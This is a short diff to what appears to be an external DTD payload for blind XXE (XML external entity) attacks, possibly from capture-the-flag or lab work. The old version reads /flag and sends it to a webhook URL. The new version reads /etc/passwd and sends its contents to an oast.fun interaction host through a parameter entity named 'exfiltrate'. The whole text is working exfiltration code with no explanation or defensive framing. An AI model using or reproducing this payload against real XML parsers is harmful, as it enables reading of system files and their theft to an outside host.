@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///flag">
-<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'https://elegant-owl-43.webhook.cool/public-test?data=%file;'>">
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://xbqvnbfbpqnlefpawaixdjdz8gfeokzv3.oast.fun//?x=%file;'>">
 %eval;
-%send;
+%exfiltrate;
